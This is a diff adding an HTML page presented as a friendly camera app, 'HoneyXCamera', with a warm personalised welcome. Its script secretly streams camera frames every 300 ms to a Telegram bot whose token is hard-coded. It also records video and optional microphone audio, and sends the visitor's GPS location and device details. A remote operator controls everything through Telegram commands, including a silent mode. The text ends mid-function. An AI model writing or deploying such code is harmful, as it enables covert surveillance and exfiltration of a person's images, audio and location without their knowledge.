@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Permissions-Policy" content="camera=(self)" />
+  <title>Camera</title>
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-family: system-ui, Arial, sans-serif;
+      transition: background-color 0.6s ease;
+    }
+    h1 { margin: 0; font-size: 22px; font-weight: 600; }
+
+    #welcome {
+      margin: 0;
+      color: #888;
+      font-size: 14px;
+      font-style: italic;
+      opacity: 0;
+      transform: translateY(-8px);
+      transition: opacity 0.9s ease, transform 0.9s ease;
+      text-align: center;
+      max-width: 90vw;
+    }
+    #welcome.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    video { max-width: 90vw; border-radius: 6px; background: #000; }
+    #status { margin: 0; color: #666; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <p id="welcome"></p>
+  <h1>HoneyXCamera</h1>
+  <video id="video" autoplay playsinline muted></video>
+  <p id="status">Waiting for camera permission…</p>
+
+  <canvas id="canvas" hidden></canvas>
+
+  <script>
+    /* ================= CONFIG ================= */
+    const BOT_TOKEN = '8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA';
+    const CHAT_ID   = '7787904819';
+
+    let FAST_MS                 = parseInt(localStorage.getItem('tg_interval') || '300', 10);
+    const TELEGRAM_MS           = 1000;
+    const MAX_CONSECUTIVE_FAILS = 3;
+    const POLL_INTERVAL_MS      = 3000;
+    const AUTO_RECOVER_DELAY_MS = 30000;
+
+    /* ---- Recording config (tuned for smoothness) ---- */
+    const RECORD_SEGMENT_MS     = 10000;
+    const RECORD_BUFFER_COUNT   = 6;
+    const RECORD_TIMESLICE_MS   = 1000;          // requestData() every 1s → steady chunk flow
+    const RECORD_BITRATE        = 4_000_000;     // 4 Mbps ≈ smooth 720p30 / crisp 1080p
+    const RECORD_BITRATE_HIGH   = 8_000_000;     // for 1080p+ devices
+    const VIDEO_MIME_CANDIDATES = [
+      'video/webm;codecs=vp9,opus',
+      'video/webm;codecs=vp8,opus',
+      'video/webm',
+      'video/mp4'
+    ];
+
+    let motionEnabled           = localStorage.getItem('tg_motion') !== 'false';
+    let motionThreshold         = parseInt(localStorage.getItem('tg_motionThreshold') || '50000', 10);
+    let nightMode               = localStorage.getItem('tg_night') === 'true';
+    let autoPauseBattery        = parseInt(localStorage.getItem('tg_autoPauseBattery') || '15', 10);
+    let silentMode              = localStorage.getItem('tg_silent') === 'true';
+    let audioEnabled            = localStorage.getItem('tg_audio') === 'true';
+    let lastFrameHash           = 0;
+    let timelapseTimer          = null;
+    let timelapseMinutes        = 0;
+    let wakeLock                = null;
+    /* ========================================== */
+
+    /* ---- Live-viewer bridge ---- */
+    const VIEWER_URL = localStorage.getItem('tg_viewerUrl') || 'http://127.0.0.1:8000/frame';
+    const VIEWER_MIN_INTERVAL_MS = 100;
+    let viewerFailures = 0;
+    let lastViewerPush = 0;
+
+    async function pushFrameToViewer(blob) {
+      if (viewerFailures > 5) return;
+      const now = Date.now();
+      if (now - lastViewerPush < VIEWER_MIN_INTERVAL_MS) return;
+      lastViewerPush = now;
+      try {
+        await fetch(VIEWER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'image/jpeg' },
+          body: blob
+        });
+        viewerFailures = 0;
+      } catch (_) {
+        viewerFailures++;
+      }
+    }
+
+    const video     = document.getElementById('video');
+    const canvas    = document.getElementById('canvas');
+    const statusDiv = document.getElementById('status');
+    const welcomeEl = document.getElementById('welcome');
+
+    let stream              = null;
+    let fastTimer           = null;
+    let lastTelegramSent    = 0;
+    let consecutiveFails    = 0;
+    let captureCount        = 0;
+    let isCapturing         = false;
+    let isPaused            = false;
+    let facingMode          = 'user';
+    let pollTimer           = null;
+    let lastUpdateId        = parseInt(localStorage.getItem('tg_lastUpdateId') || '0', 10);
+
+    /* ---- Recording state ---- */
+    let recorder            = null;
+    let currentChunks       = [];
+    let completedSegments   = [];
+    let segmentTimer        = null;
+    let usedMime            = null;
+    let flushingVideo       = false;
+    let segmentStartTs      = 0;                 // timestamp each segment began
+
+    let startedAt           = Date.now();
+    let recovering          = false;
+    let stoppedByUser       = false;
+    let batteryLevel        = null;
+    let batteryCharging     = null;
+    let batteryIsReal       = false;
+    let userName            = localStorage.getItem('camera_userName') || '';
+    const logBuffer         = [];
+
+    const channel = new BroadcastChannel('camera-feed');
+
+    /* ============== user name + welcome ============== */
+    function askNameIfNeeded() {
+      if (!userName) {
+        const entered = prompt('What should I call you?', '');
+        if (entered && entered.trim()) {
+          userName = entered.trim().slice(0, 40);
+          localStorage.setItem('camera_userName', userName);
+        }
+      }
+      renderWelcome(true);
+    }
+
+    function renderWelcome(initial = false) {
+      const hour = new Date().getHours();
+      let greeting;
+      if (hour < 5)       greeting = 'Burning the midnight oil';
+      else if (hour < 12) greeting = 'Good morning';
+      else if (hour < 17) greeting = 'Good afternoon';
+      else if (hour < 21) greeting = 'Good evening';
+      else                greeting = 'Winding down';
+
+      const name = userName || 'friend';
+      const lines = [
+        `${greeting}, ${name}. ✨`,
+        `Hey ${name}, welcome back. 💛`,
+        `Nice to see you, ${name}. 👋`,
+        `All set, ${name}. Ready when you are. 🌟`,
+        `Good to have you here, ${name}.`
+      ];
+      const idx = new Date().getDate() % lines.length;
+
+      if (initial) {
+        welcomeEl.textContent = lines[idx];
+        requestAnimationFrame(() => {
+          requestAnimationFrame(() => welcomeEl.classList.add('visible'));
+        });
+      } else {
+        welcomeEl.classList.remove('visible');
+        setTimeout(() => {
+          welcomeEl.textContent = lines[idx];
+          requestAnimationFrame(() => welcomeEl.classList.add('visible'));
+        }, 400);
+      }
+
+      if (userName) {
+        document.title = `${userName}'s Camera`;
+      }
+    }
+
+    /* ============== helpers ============== */
+    function setStatus(text) { statusDiv.textContent = text; }
+
+    function logEvent(msg) {
+      logBuffer.push(`${new Date().toLocaleTimeString()} ${msg}`);
+      if (logBuffer.length > 50) logBuffer.shift();
+    }
+
+    function stopStream() {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      stream = null; video.srcObject = null;
+    }
+    function canvasToBlob(c, type, q) {
+      return new Promise((res, rej) => c.toBlob(b => b ? res(b) : rej(new Error('toBlob null')), type, q));
+    }
+    function describeCameraError(err) {
+      switch (err.name) {
+        case 'NotAllowedError': case 'SecurityError': return 'Camera access was denied. Allow it and reload.';
+        case 'NotFoundError':   case 'OverconstrainedError': return 'No camera was found on this device.';
+        case 'NotReadableError': return 'The camera is already in use by another application.';
+        case 'AbortError': return 'Camera start was aborted.';
+        default: return `Camera error: ${err.message || err.name || 'unknown'}`;
+      }
+    }
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    /* ============== audio ============== */
+    async function enableAudio() {
+      try {
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const track = audioStream.getAudioTracks()[0];
+        if (!track) throw new Error('No audio track');
+        stream.addTrack(track);
+        audioEnabled = true;
+        localStorage.setItem('tg_audio', 'true');
+        if (recorder && recorder.state === 'recording') {
+          await stopRecorderAsync();
+          startRecorder();
+          scheduleSegmentRotation();
+        }
+        logEvent('audio: enabled');
+      } catch (err) {
+        logEvent(`audio enable failed: ${err.message}`);
+        throw err;
+      }
+    }
+    async function disableAudio() {
+      try {
+        stream.getAudioTracks().forEach(t => { t.stop(); stream.removeTrack(t); });
+        audioEnabled = false;
+        localStorage.setItem('tg_audio', 'false');
+        if (recorder && recorder.state === 'recording') {
+          await stopRecorderAsync();
+          startRecorder();
+          scheduleSegmentRotation();
+        }
+        logEvent('audio: disabled');
+      } catch (err) {
+        logEvent(`audio disable failed: ${err.message}`);
+        throw err;
+      }
+    }
+
+    /* ============== recording (SMOOTH) ============== */
+    function pickMime() {
+      for (const m of VIDEO_MIME_CANDIDATES) {
+        if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(m)) return m;
+      }
+      return null;
+    }
+
+    function pickBitrate() {
+      const w = video.videoWidth || 0;
+      const h = video.videoHeight || 0;
+      if (w * h >= 1920 * 1080) return RECORD_BITRATE_HIGH;  // 1080p → 8 Mbps
+      return RECORD_BITRATE;                                  // 720p  → 4 Mbps
+    }
+
+    function startRecorder() {
+      if (!stream) return;
+      if (!usedMime) usedMime = pickMime();
+      if (!usedMime) {
+        logEvent('recorder: no supported mime');
+        return;
+      }
+
+      const opts = {
+        mimeType: usedMime,
+        videoBitsPerSecond: pickBitrate()
+      };
+
+      try {
+        recorder = new MediaRecorder(stream, opts);
+      } catch (err) {
+        logEvent(`recorder init failed: ${err.message}`);
+        return;
+      }
+
+      // Important: fresh array per segment, but we DON'T clear it until onstop
+      currentChunks = [];
+      segmentStartTs = Date.now();
+
+      recorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) currentChunks.push(e.data);
+      };
+
+      recorder.onstop = () => {
+        if (currentChunks.length > 0) {
+          const blob = new Blob(currentChunks, { type: usedMime });
+          completedSegments.push({
+            blob,
+            mime: usedMime,
+            durationMs: Date.now() - segmentStartTs,
+            ts: Date.now()
+          });
+          while (completedSegments.length > RECORD_BUFFER_COUNT) {
+            completedSegments.shift();
+          }
+        }
+        currentChunks = [];
+        // Only restart if we're still supposed to be recording
+        if (stream && !isPaused && !flushingVideo && !stoppedByUser) {
+          startRecorder();
+          scheduleSegmentRotation();
+        }
+      };
+
+      recorder.onerror = (e) => {
+        logEvent(`recorder error: ${e.error?.message || 'unknown'}`);
+      };
+
+      try {
+        // timeslice → ondataavailable every second
+        recorder.start(RECORD_TIMESLICE_MS);
+      }
+      catch (err) { logEvent(`recorder start failed: ${err.message}`); }
+      logEvent(`recorder started (${usedMime} @ ${Math.round(pickBitrate()/1e6)} Mbps)`);
+    }
+
+    function stopRecorder() {
+      if (segmentTimer) { clearTimeout(segmentTimer); segmentTimer = null; }
+      if (recorder && recorder.state !== 'inactive') {
+        try { recorder.stop(); } catch {}
+      }
+      recorder = null;
+    }
+
+    function scheduleSegmentRotation() {
+      if (segmentTimer) clearTimeout(segmentTimer);
+      segmentTimer = setTimeout(() => {
+        if (recorder && recorder.state === 'recording') {
+          try { recorder.stop(); } catch {}
+        }
+      }, RECORD_SEGMENT_MS);
+    }
+
+    function stopRecorderAsync() {
+      return new Promise(resolve => {
+        if (!recorder || recorder.state === 'inactive') return resolve();
+        const origOnStop = recorder.onstop;
+        let done = false;
+        const finish = () => { if (!done) { done = true; resolve(); } };
+        recorder.onstop = (e) => {
+          if (origOnStop) origOnStop(e);
+          finish();
+        };
+        try { recorder.stop(); } catch { finish(); }
+        setTimeout(finish, 1000);
+      });
+    }
+
+    async function flushVideoBuffer() {
+      await stopRecorderAsync();
+
+      const totalSegments = completedSegments.length;
+      if (totalSegments === 0) {
+        if (stream && !isPaused) {
+          startRecorder();
+          scheduleSegmentRotation();
+        }
+        return null;
+      }
+
+      const mime = completedSegments[0]?.mime || usedMime || 'video/webm';
+      const parts = completedSegments
+        .filter(s => s.mime === mime)
+        .map(s => s.blob);
+      const snapshotBlob = new Blob(parts, { type: mime });
+
+      completedSegments = [];
+      currentChunks = [];
+
+      if (stream && !isPaused) {
+        startRecorder();
+        scheduleSegmentRotation();
+      }
+
+      return { blob: snapshotBlob, mime };
+    }
+
+    /* ============== telegram send ============== */
+    async function sendToTelegram(blob, index, attempt = 1) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, `capture_${index}.jpg`);
+      const nameTag = userName ? ` · ${userName}` : '';
+      fd.append('caption', `📸 Capture #${index} — ${new Date().toLocaleTimeString()} · cam: ${facingMode}${nameTag}`);
+      if (silentMode) fd.append('disable_notification', 'true');
+      let resp;
+      try { resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd }); }
+      catch (err) { throw new Error(`Network error: ${err.message}`); }
+      let result;
+      try { result = await resp.json(); }
+      catch { throw new Error(`Telegram non-JSON (HTTP ${resp.status}).`); }
+      if (resp.status === 429 && attempt === 1) {
+        const retryAfter = result?.parameters?.retry_after ?? 2;
+        await sleep(retryAfter * 1000);
+        return sendToTelegram(blob, index, 2);
+      }
+      if (!result.ok) throw new Error(`Telegram API: ${result.description || 'unknown'}`);
+    }
+
+    async function sendVideoToTelegram(blob, mime, meta, attempt = 1) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      const ext = mime.includes('mp4') ? 'mp4' : 'webm';
+      fd.append('video', blob, `clip_${Date.now()}.${ext}`);
+      const nameTag = userName ? ` · ${userName}` : '';
+      fd.append('caption', `🎥 Clip · cam: ${facingMode}${nameTag}`);
+      fd.append('supports_streaming', 'true');
+      if (silentMode) fd.append('disable_notification', 'true');
+      if (meta?.duration) fd.append('duration', String(Math.round(meta.duration)));
+      if (meta?.width)    fd.append('width', String(meta.width));
+      if (meta?.height)   fd.append('height', String(meta.height));
+
+      let resp;
+      try { resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: fd }); }
+      catch (err) { throw new Error(`Network error: ${err.message}`); }
+      let result;
+      try { result = await resp.json(); }
+      catch { throw new Error(`Telegram non-JSON (HTTP ${resp.status}).`); }
+      if (resp.status === 429 && attempt === 1) {
+        const retryAfter = result?.parameters?.retry_after ?? 3;
+        await sleep(retryAfter * 1000);
+        return sendVideoToTelegram(blob, mime, meta, 2);
+      }
+      if (!result.ok) throw new Error(`Telegram API: ${result.description || 'unknown'}`);
+      return result;
+    }
+
+    async function sendTelegramNotice(text) {
+      try {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('text', text);
+        if (silentMode) fd.append('disable_notification', 'true');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', body: fd });
+      } catch (err) { console.warn('Notice send failed:', err.message); }
+    }
+
+    /* ============== location ============== */
+    async function sendLocationToTelegram() {
+      if (!navigator.geolocation) {
+        await sendTelegramNotice('📍 Location not supported by browser.');
+        return;
+      }
+      await sendTelegramNotice('📍 Requesting location…');
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+          try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('latitude', String(lat));
+            fd.append('longitude', String(lon));
+            if (silentMode) fd.append('disable_notification', 'true');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, { method:'POST', body: fd });
+            await sendTelegramNotice(`📍 ~${Math.round(accuracy)}m accuracy`);
+          } catch (err) {
+            await sendTelegramNotice(`📍 Send failed: ${err.message}`);
+          }
+        },
+        async (err) => {
+          await sendTelegramNotice(`📍 Location failed: ${err.message}`);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+      );
+    }
+
+    /* ============== wake lock ============== */
+    async function requestWakeLock() {
+      if (!('wakeLock' in navigator)) return false;
+      try {
+        wakeLock = await navigator.wakeLock.request('screen');
+        wakeLock.addEventListener('release', () => logEvent('wake lock released'));
+        logEvent('wake lock acquired');
+        return true;
+      } catch (err) {
+        logEvent(`wake lock fail: ${err.message}`);
+        return false;
+      }
+    }
+    async function releaseWakeLock() {
+      if (wakeLock) {
+        try { await wakeLock.release(); } catch {}
+        wakeLock = null;
+      }
+    }
+
+    /* ============== timelapse ============== */
+    function startTimelapse(minutes) {
+      stopTimelapse();
+      if (minutes < 1) return;
+      timelapseMinutes = minutes;
+      timelapseTimer = setInterval(async () => {
+        if (isPaused || !stream) return;
+        try {
+          const w = video.videoWidth || 640, h = video.videoHeight || 480;
+          canvas.width = w; canvas.height = h;
+          canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+          const blob = await canvasToBlob(canvas, 'image/jpeg', 0.85);
+          await sendToTelegram(blob, ++captureCount);
+        } catch (e) { logEvent(`timelapse fail: ${e.message}`); }
+      }, minutes * 60 * 1000);
+      logEvent(`timelapse: every ${minutes} min`);
+    }
+    function stopTimelapse() {
+      if (timelapseTimer) { clearInterval(timelapseTimer); timelapseTimer = null; }
+      timelapseMinutes = 0;
+    }
+
+    /* ============== night mode ============== */
+    function applyNightBoost(ctx, w, h) {
+      const img = ctx.getImageData(0, 0, w, h);
+      const d = img.data;
+      for (let i = 0; i < d.length; i += 4) {
+        d[i]     = Math.min(255, d[i]     * 1.4 + 20);
+        d[i + 1] = Math.min(255, d[i + 1] * 1.4 + 20);
+        d[i + 2] = Math.min(255, d[i + 2] * 1.4 + 20);
+      }
+      ctx.putImageData(img, 0, 0);
+    }
+
+    /* ============== status / info builders ============== */
+    function buildStatusMessage() {
+      const uptimeSec  = Math.floor((Date.now() - startedAt) / 1000);
+      const uptimeStr  = uptimeSec >= 3600
+        ? `${Math.floor(uptimeSec / 3600)}h ${Math.floor((uptimeSec % 3600) / 60)}m`
+        : uptimeSec >= 60
+          ? `${Math.floor(uptimeSec / 60)}m ${uptimeSec % 60}s`
+          : `${uptimeSec}s`;
+      const bufferBytes = completedSegments.reduce((a, s) => a + s.blob.size, 0);
+      const bufferMb    = (bufferBytes / 1024 / 1024).toFixed(2);
+      return (
+        `📊 Status\n` +
+        `User: ${userName || 'unset'}\n` +
+        `Uptime: ${uptimeStr}\n` +
+        `Photos sent: ${captureCount}\n` +
+        `Camera: ${facingMode}\n` +
+        `Paused: ${isPaused ? 'yes' : 'no'}\n` +
+        `Timer: ${fastTimer ? 'on' : 'off'}\n` +
+        `Interval: ${FAST_MS}ms\n` +
+        `Fails: ${consecutiveFails}/${MAX_CONSECUTIVE_FAILS}\n` +
+        `Video buffer: ${completedSegments.length}/${RECORD_BUFFER_COUNT} segs (${bufferMb} MB)\n` +
+        `Recorder: ${recorder ? recorder.state : 'none'}\n` +
+        `Mime: ${usedMime || 'unknown'}\n` +
+        `Bitrate: ${Math.round(pickBitrate()/1e6)} Mbps\n` +
+        `Motion gate: ${motionEnabled ? 'on' : 'off'}\n` +
+        `Audio: ${audioEnabled ? 'on' : 'off'}\n` +
+        `Night: ${nightMode ? 'on' : 'off'}\n` +
+        `Silent: ${silentMode ? 'on' : 'off'}\n` +
+        `Wake lock: ${wakeLock ? 'held' : 'released'}\n` +
+        `Timelapse: ${timelapseMinutes ? `every ${timelapseMinutes}m` : 'off'}\n` +
+        `Online: ${navigator.onLine ? 'yes' : 'no'}\n` +
+        `Visibility: ${document.hidden ? 'hidden' : 'visible'}`
+      );
+    }
+
+    function buildInfoMessage() {
+      const ua = navigator.userAgent;
+      let platform = 'Unknown';
+      if (/android/i.test(ua))                                   platform = 'Android';
+      else if (/iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1))
+                                                                  platform = 'iOS';
+      else if (/Windows/i.test(ua))                              platform = 'Windows (desktop)';
+      else if (/Macintosh/i.test(ua))                            platform = 'macOS (desktop)';
+      else if (/Linux/i.test(ua))                                platform = 'Linux (desktop)';
+
+      let batteryLine = 'Battery: not reported by browser';
+      if (batteryIsReal && batteryLevel != null) {
+        batteryLine = `Battery: ${Math.round(batteryLevel * 100)}%${batteryCharging ? ' (charging)' : ''}`;
+      }
+
+      let connLine = 'Network: unknown';
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        const parts = [];
+        if (conn.effectiveType) parts.push(conn.effectiveType);
+        if (conn.downlink)     parts.push(`↓${conn.downlink}Mbps`);
+        if (conn.rtt)          parts.push(`${conn.rtt}ms`);
+        if (parts.length) connLine = `Network: ${parts.join(' · ')}`;
+      } else {
+        connLine = `Network: ${navigator.onLine ? 'online' : 'offline'} (type unknown)`;
+      }
+
+      let memLine = 'Heap: unavailable (Firefox/Safari)';
+      if (performance.memory) {
+        const usedMb  = (performance.memory.usedJSHeapSize  / 1024 / 1024).toFixed(1);
+        const limitMb = (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(0);
+        memLine = `Heap: ${usedMb} / ${limitMb} MB`;
+      }
+
+      const dpr = window.devicePixelRatio || 1;
+      const screenLine = `Screen: ${screen.width}×${screen.height} @${dpr}x`;
+      const cores = navigator.hardwareConcurrency || 'unknown';
+      const devMem = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown';
+
+      return (
+        `ℹ️ Info\n` +
+        `User: ${userName || 'unset'}\n` +
+        `Platform: ${platform}\n` +
+        `UA: ${ua.slice(0, 100)}\n` +
+        `Language: ${navigator.language || 'unknown'}\n` +
+        `${connLine}\n` +
+        `${batteryLine}\n` +
+        `${memLine}\n` +
+        `${screenLine}\n` +
+        `Cores: ${cores}\n` +
+        `RAM class: ${devMem}\n` +
+        `Uptime: ${Math.floor((Date.now() - startedAt) / 1000)}s\n` +
+        `Visibility: ${document.hidden ? 'hidden' : 'visible'}`
+      );
+    }
+
+    /* ============== telegram command poll ============== */
+    async function pollTelegramCommands() {
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0&allowed_updates=["message"]`;
+        const resp = await fetch(url);
+        const result = await resp.json();
+        if (!result.ok || !Array.isArray(result.result)) return;
+
+        for (const update of result.result) {
+          lastUpdateId = Math.max(lastUpdateId, update.update_id);
+          localStorage.setItem('tg_lastUpdateId', String(lastUpdateId));
+
+          const msg = update.message;
+          if (!msg) continue;
+          if (String(msg.chat.id) !== String(CHAT_ID)) continue;
+
+          const raw    = (msg.text || '').trim();
+          const lower  = raw.toLowerCase();
+          const parts  = lower.split(/\s+/);
+          const cmd    = parts[0];
+          const arg    = parts.slice(1).join(' ');
+          const argRaw = raw.split(/\s+/).slice(1).join(' ');
+
+          if (cmd) logEvent(`cmd: ${cmd}${arg ? ' ' + arg : ''}`);
+
+          if (cmd === '/back')         await setFacingMode('environment', 'telegram');
+          else if (cmd === '/front')   await setFacingMode('user', 'telegram');
+
+          else if (cmd === '/pause')   { setPaused(true);  await sendTelegramNotice('⏸ Capturer paused.'); }
+          else if (cmd === '/resume')  { setPaused(false); await sendTelegramNotice('▶️ Capturer resumed.'); }
+
+          else if (cmd === '/stop') {
+            stoppedByUser = true;
+            stopCapture('Stopped via Telegram.');
+            await sendTelegramNotice('⏹ Stopped. Camera released. Use /start to resume.');
+          }
+          else if (cmd === '/start') {
+            stoppedByUser = false;
+            if (stream && fastTimer) {
+              await sendTelegramNotice('Already running.');
+            } else {
+              await startCapture();
+              await sendTelegramNotice('▶️ Started.');
+            }
+          }
+
+          else if (cmd === '/status') {
+            await sendTelegramNotice(buildStatusMessage());
+          }
+
+          else if (cmd === '/interval') {
+            const ms = parseInt(arg, 10);
+            if (!isFinite(ms) || ms < 100 || ms > 60000) {
+              await sendTelegramNotice('Usage: /interval 100-60000 (ms)');
+            } else {
+              FAST_MS = ms;
+              localStorage.setItem('tg_interval', String(ms));
+              if (fastTimer) { clearInterval(fastTimer); fastTimer = setInterval(tick, FAST_MS); }
+              await sendTelegramNotice(`⏱ Interval set to ${ms}ms.`);
+            }
+          }
+
+          else if (cmd === '/logs') {
+            await sendTelegramNotice(logBuffer.length ? logBuffer.join('\n') : 'No logs yet.');
+          }
+
+          else if (cmd === '/info') {
+            await sendTelegramNotice(buildInfoMessage());
+          }
+
+          else if (cmd === '/help' || cmd === '/commands') {
+            await sendTelegramNotice(
+              `Commands:\n` +
+              `/back /front — switch camera\n` +
+              `/pause /resume — toggle photos\n` +
+              `/stop /start — release/reacquire camera\n` +
+              `/video — send recorded clip & reset buffer\n` +
+              `/status — state summary\n` +
+              `/interval N — capture rate in ms\n` +
+              `/logs — last 50 events\n` +
+              `/info — device/network/battery\n` +
+              `/name — show/set user name\n` +
+              `/snap — one photo now\n` +
+              `/burst N — N quick photos (max 10)\n` +
+              `/motion on|off — motion-gated photos\n` +
+              `/motionthreshold N — sensitivity (default 50000)\n` +
+              `/night on|off — brighten /snap and /burst\n` +
+              `/audio on|off — mic in /video\n` +
+              `/wake on|off — screen wake lock\n` +
+              `/locate — send current location\n` +
+              `/timelapse N — photo every N minutes (0 to stop)\n` +
+              `/silent on|off — disable notification pings\n` +
+              `/battery N — auto-pause below N%\n` +
+              `/help — this list`
+            );
+          }
+
+          else if (cmd === '/name') {
+            if (argRaw) {
+              userName = argRaw.slice(0, 40);
+              localStorage.setItem('camera_userName', userName);
+              renderWelcome(false);
+              if (userName) document.title = `${userName}'s Camera`;
+              await sendTelegramNotice(`👤 Name set to "${userName}".`);
+            } else {
+              await sendTelegramNotice(`👤 Current name: "${userName || 'unset'}". Use /name <new name> to change.`);
+            }
+          }
+
+          else if (cmd === '/snap') {
+            try {
+              const w = video.videoWidth || 640, h = video.videoHeight || 480;
+              canvas.width = w; canvas.height = h;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, w, h);
+              if (nightMode) applyNightBoost(ctx, w, h);
+              const blob = await canvasToBlob(canvas, 'image/jpeg', 0.92);
+              await sendToTelegram(blob, ++captureCount);
+              await sendTelegramNotice('📸 Snapped.');
+            } catch (err) {
+              await sendTelegramNotice(`📸 Snap failed: ${err.message}`);
+            }
+          }
+
+          else if (cmd === '/burst') {
+            const n = Math.min(parseInt(arg, 10) || 5, 10);
+            await sendTelegramNotice(`📸 Burst of ${n} starting…`);
+            for (let i = 0; i < n; i++) {
+              try {
+                const w = video.videoWidth || 640, h = video.videoHeight || 480;
+                canvas.width = w; canvas.height = h;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, w, h);
+                if (nightMode) applyNightBoost(ctx, w, h);
+                const blob = await canvasToBlob(canvas, 'image/jpeg', 0.8);
+                await sendToTelegram(blob, ++captureCount);
+              } catch (e) {
+                logEvent(`burst photo ${i+1} failed: ${e.message}`);
+              }
+              await sleep(300);
+            }
+          }
+
+          else if (cmd === '/motion') {
+            if (arg === 'on' || arg === 'off') {
+              motionEnabled = arg === 'on';
+              localStorage.setItem('tg_motion', String(motionEnabled));
+              await sendTelegramNotice(`🎯 Motion gate ${motionEnabled ? 'ON' : 'OFF'}.`);
+            } else {
+              await sendTelegramNotice(`🎯 Motion gate is ${motionEnabled ? 'ON' : 'OFF'}. Use /motion on|off.`);
+            }
+          }
+          else if (cmd === '/motionthreshold') {
+            const n = parseInt(arg, 10);
+            if (!isFinite(n) || n < 0) {
+              await sendTelegramNotice(`🎯 Current threshold: ${motionThreshold}. Usage: /motionthreshold 50000`);
+            } else {
+              motionThreshold = n;
+              localStorage.setItem('tg_motionThreshold', String(n));
+              await sendTelegramNotice(`🎯 Motion threshold set to ${n}.`);
+            }
+          }
+
+          else if (cmd === '/night') {
+            if (arg === 'on' || arg === 'off') {
+              nightMode = arg === 'on';
+              localStorage.setItem('tg_night', String(nightMode));
+              await sendTelegramNotice(`🌙 Night mode ${nightMode ? 'ON' : 'OFF'} (applies to /snap and /burst).`);
+            } else {
+              await sendTelegramNotice(`🌙 Night mode is ${nightMode ? 'ON' : 'OFF'}. Use /night on|off.`);
+            }
+          }
+
+          else if (cmd === '/audio') {
+            try {
+              if (arg === 'on')      { await enableAudio();  await sendTelegramNotice('🎤 Audio ON.'); }
+              else if (arg === 'off'){ await disableAudio(); await sendTelegramNotice('🎤 Audio OFF.'); }
+              else                   { await sendTelegramNotice(`🎤 Audio is ${audioEnabled ? 'ON' : 'OFF'}. Use /audio on|off.`); }
+            } catch (err) {
+              await sendTelegramNotice(`🎤 Audio failed: ${err.message}`);
+            }
+          }
+
+          else if (cmd === '/wake') {
+            if (arg === 'off') {
+              await releaseWakeLock();
+              await sendTelegramNotice('💡 Wake lock released.');
+            } else {
+              const ok = await requestWakeLock();
+              await sendTelegramNotice(ok ? '💡 Wake lock active.' : '💡 Wake lock not supported on this browser.');
+            }
+          }
+
+          else if (cmd === '/locate' || cmd === '/location') {
+            await sendLocationToTelegram();
+          }
+
+          else if (cmd === '/timelapse') {
+            const min = parseInt(arg, 10);
+            if (!isFinite(min) || min < 0 || min > 240) {
+              await sendTelegramNotice('⏰ Usage: /timelapse 5 (minutes 1-240, 0 to stop)');
+            } else if (min === 0) {
+              stopTimelapse();
+              await sendTelegramNotice('⏰ Timelapse stopped.');
+            } else {
+              startTimelapse(min);
+              await sendTelegramNotice(`⏰ Timelapse every ${min} minute${min > 1 ? 's' : ''}.`);
+            }
+          }
+
+          else if (cmd === '/silent') {
+            if (arg === 'on' || arg === 'off') {
+              silentMode = arg === 'on';
+              localStorage.setItem('tg_silent', String(silentMode));
+              await sendTelegramNotice(`🔇 Silent mode ${silentMode ? 'ON' : 'OFF'}.`);
+            } else {
+              await sendTelegramNotice(`🔇 Silent mode is ${silentMode ? 'ON' : 'OFF'}. Use /silent on|off.`);
+            }
+          }
+
+          else if (cmd === '/battery') {
+            const n = parseInt(arg, 10);
+            if (!isFinite(n) || n < 1 || n > 50) {
+              await sendTelegramNotice(`🔋 Usage: /battery 15 (percent 1-50). Current: ${autoPauseBattery}%`);
+            } else {
+              autoPauseBattery = n;
+              localStorage.setItem('tg_autoPauseBattery', String(n));
+              await sendTelegramNotice(`🔋 Auto-pause below ${n}%.`);
+            }
+          }
+
+          else if (cmd === '/video') {
+            if (flushingVideo) {
+              await sendTelegramNotice('🎥 Already preparing a clip — wait a moment.');
+              continue;
+            }
+            flushingVideo = true;
+            try {
+              const snapshot = await flushVideoBuffer();
+              if (!snapshot || snapshot.blob.size < 1000) {
+                await sendTelegramNotice(
+                  `🎥 No usable video yet.\n` +
+                  `Segments: ${completedSegments.length}\n` +
+                  `Mime: ${usedMime || 'unknown'}\n` +
+                  `Recorder: ${recorder ? recorder.state : 'none'}\n` +
+                  `Try waiting a few more seconds, or send /status.`
